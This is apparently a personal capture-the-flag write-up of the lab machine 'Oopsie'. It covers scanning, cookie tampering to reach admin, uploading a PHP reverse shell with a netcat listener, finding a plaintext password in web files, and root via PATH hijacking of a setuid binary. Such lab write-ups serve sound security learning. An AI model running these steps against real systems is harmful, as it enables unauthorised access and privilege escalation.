
# Oopsie 

## Initial Scanning

- Started with `nmap -sC -sV`
- Noticed open HTTP and SSH ports.
- Other filtered ports didn’t seem meaningful (look into it later).

## Web Application Analysis

- Used Burp Suite to inspect all HTTP requests by routing them through a proxy.
- Found a login page in the Target tab.
- Tried common username/password combinations — didn’t work.
- Observed two cookies: `role` and `user id`.
- Saw that query parameters in requests passed the account ID.
- Changed the account ID and got the admin user ID.
- Edited the cookie to:
  - Change role to `admin`
  - Set the admin user ID

### Result
- Gained access to a new file upload tab.
- Uploaded a PHP reverse shell from `/usr/share/webshells/php/php-reverse-shell.php` (no validation on file upload).

## Directory Brute Forcing

```bash
gobuster dir --url http://10.129.108.104/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

- Found `/upload` directory (access denied directly).
- Ran Netcat listener: `nc -lvnp 1234`
- Accessed uploaded file via: `http://{target}/uploads/{filename}`
- Got a dumb shell.

## Upgrading Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Credential Discovery

- Explored: `/var/www/html/cdn-cgi/login`
- Used: `cat * | grep -i passw*`
- Found password: **[REDACTED]**

## User Escalation

- Found user `robert` in `/etc/passwd`
- Tried `su robert` — password incorrect.
- Found a different password in `db.php`: `M3g4C0rpUs3r!`
- Logged in as `robert` and retrieved user flag from home directory.

## Privilege Escalation

- Tried `sudo -l` — no sudo privileges.
- Used `id` and found user in group: `bugtracker`
- Searched for files owned by `bugtracker`:

```bash
find / -group bugtracker 2>/dev/null
```

- Found: `/usr/bin/bugtracker`
- Inspected file:

```bash
ls -la /usr/bin/bugtracker
file /usr/bin/bugtracker
```

- Noted `setuid` bit — allows execution with root privileges.

## Exploiting `bugtracker` Binary

- Created fake `cat` in `/tmp` with contents:

```bash
#!/bin/sh
/bin/sh
```

- Made it executable: `chmod +x cat`
- Modified `PATH`:

```bash
export PATH=/tmp:$PATH
```

- Ran `/usr/bin/bugtracker` — gained root shell.

## Root Flag

- Retrieved root flag: **[REDACTED]**

## Notes

- **winPEAS**: Local enumeration for privilege escalation.
- **psexec.py**: Authenticate and get a shell with high privileges (SMB-based).
- **SetUID**: Set owner user ID — lets a non-root user execute as root.
